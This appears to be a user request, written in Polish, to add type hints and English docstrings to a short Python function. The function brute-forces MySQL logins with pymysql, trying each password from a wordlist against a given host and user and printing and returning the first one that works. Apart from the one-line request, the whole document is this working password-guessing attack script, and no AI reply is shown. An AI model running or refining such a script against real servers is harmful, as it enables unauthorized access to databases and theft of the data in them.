dodaj annotacje typów, ang docsting i wszystko ang

import pymysql

def mysql_bruteforce(host, username, wordlist_path, port=3306):
    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()
            try:
                conn = pymysql.connect(
                    host=host,
                    user=username,
                    password=password,
                    port=port,
                    connect_timeout=3
                )
                print(f"[+] MySQL Zalogowano: {username}:{password}")
                conn.close()
                return password
            except pymysql.err.OperationalError:
                continue
            except Exception as e:
                print(f"[!] Błąd: {e}")
                continue
    return None
